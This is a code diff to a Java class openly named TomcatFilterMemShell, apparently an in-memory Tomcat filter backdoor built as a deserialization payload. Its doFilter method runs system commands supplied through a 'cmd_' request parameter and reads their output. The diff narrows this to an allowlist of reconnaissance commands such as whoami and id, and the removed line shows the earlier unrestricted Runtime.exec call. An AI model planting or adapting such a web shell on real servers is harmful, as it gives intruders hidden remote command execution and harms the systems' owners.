@@ -17,10 +17,16 @@ import org.apache.catalina.Context;
 import org.springframework.stereotype.Component;
 
 import javax.servlet.*;
+import javax.servlet.http.HttpServletResponse;
 import java.util.*;
 
 @Component
 public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
+    private static final Set<String> ALLOWED_COMMANDS = new HashSet<>(
+            Arrays.asList("whoami", "id", "date", "pwd", "hostname", "uname"));
+    private static final java.util.regex.Pattern SAFE_ARG =
+            java.util.regex.Pattern.compile("^[a-zA-Z0-9_/.=-]+$");
+
     static{
         try {
             System.out.println("Tomcat filter backdoor class is loading...");
@@ -94,7 +100,17 @@ public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
         String cmd;
         if ((cmd = servletRequest.getParameter("cmd_")) != null) {
-            Process process = Runtime.getRuntime().exec(cmd);
+            // No shell; only allowlisted programs with conservative arguments may run.
+            String[] argv = cmd.trim().split("\\s+");
+            boolean allowed = ALLOWED_COMMANDS.contains(argv[0]);
+            for (int i = 1; allowed && i < argv.length; i++) {
+                allowed = SAFE_ARG.matcher(argv[i]).matches();
+            }
+            if (!allowed) {
+                ((HttpServletResponse) servletResponse).sendError(HttpServletResponse.SC_FORBIDDEN);
+                return;
+            }
+            Process process = new ProcessBuilder(argv).redirectErrorStream(true).start();
             java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                     new java.io.InputStreamReader(process.getInputStream()));
             StringBuilder stringBuilder = new StringBuilder();
